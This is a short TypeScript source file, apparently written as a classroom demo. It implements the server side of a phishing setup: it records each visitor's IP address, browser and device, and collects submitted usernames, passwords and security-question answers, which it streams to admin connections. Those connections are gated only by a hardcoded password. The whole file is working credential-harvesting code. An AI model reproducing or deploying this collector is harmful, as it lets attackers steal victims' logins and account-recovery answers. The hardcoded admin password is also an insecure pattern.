// This is a demo, so I'm not going to use SSL here. You can fork it and add SSL if you want to
// use it for some random reason. In my demonstration, this system is sending and receiving data
// through a reverse proxy that is using SSL. Decent for my setup, maybe not for yours.

import express from "express";
import http from "http";
import { Server, Socket } from "socket.io";

import UAParser from "ua-parser-js";

// Initialize server information
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    path: "/report/"
});

// secure ikr?
const adminPw = "hackerman";

// Just doing this to test that the is running.
app.get("/", (req, res) => res.send("What a great day to get hacked!"));

// I already know that people are going to spam this server because we're presenting
// to a bunch of high school students and they're going to think they're funny. So,
// I'm going to keep the noise out of the console by only logging unique IP addresses.
const addrCache = new Set();

// Gonna make a session ID map too to tokenize session IDs. They're a little too long
// and they just make a bunch of random crap in the console.
const sidMap = new Map();

const authorizedCns: Set<Socket> = new Set();

io.on("connection", (socket) => {
    const ipAddr = socket.handshake.headers["x-forwarded-for"] ?? socket.handshake.address;
    const hasConnected = addrCache.has(ipAddr);
    
    let pseudoSid = sidMap.get(socket.id);
    if (!pseudoSid) {
        pseudoSid = Math.floor(Math.random() * 1000);
        sidMap.set(socket.id, pseudoSid); // set random pseudosid 0-999
    }

    if (!hasConnected) {
        addrCache.add(ipAddr);
        sendLog(`[${pseudoSid}] IP address: ${ipAddr}`);

        const ua = new UAParser(socket.handshake.headers["user-agent"]);
        sendLog(`[${pseudoSid}] Browser: ${ua.getBrowser().name ?? "unknown"} ${ua.getBrowser().version ?? "(unknown version)"}`);
        sendLog(`[${pseudoSid}] OS: ${ua.getOS().name} ${ua.getOS().version ?? "unknown"}`);
        sendLog(`[${pseudoSid}] Device: ${ua.getDevice().vendor ?? "(unknown vendor)"} ${ua.getDevice().model ?? "(unknown model)"}`);
    }

    socket.on("admin", (data) => {
        // I'm not going to bother with a proper authentication system
        if (data.password !== adminPw) {
            console.log(`[${pseudoSid}] Connection unauthorized.`);
            socket.emit("adminauth", { success: false });
            return;
        }

        sendLog(`[${pseudoSid}] Connection authorized.`);
        socket.emit("adminauth", { success: true });

        // disconnect 
        authorizedCns.add(socket);
        socket.on("disconnect", () => authorizedCns.delete(socket));
    });

    function sendLog(data: string) {
        for (const cn of authorizedCns)
            cn.emit("log", data);
    }

    socket.on("credentials", (data) => {
        sendLog(`[${pseudoSid}] Username: ${data.username}`);
        sendLog(`[${pseudoSid}] Password: ${data.password}`);
    });

    socket.on("sq", (data) => {
        sendLog(`[${pseudoSid}] Security Question: "${data.question}", answered "${data.answer}"`);
    });

    socket.on("disconnect", () => {
        if (!hasConnected)
            sendLog(`[${pseudoSid}] Disconnected.`);
        sidMap.delete(socket.id);
    });
});

// Start the server.
server.listen(80, () => console.log("Server is running on port 80."));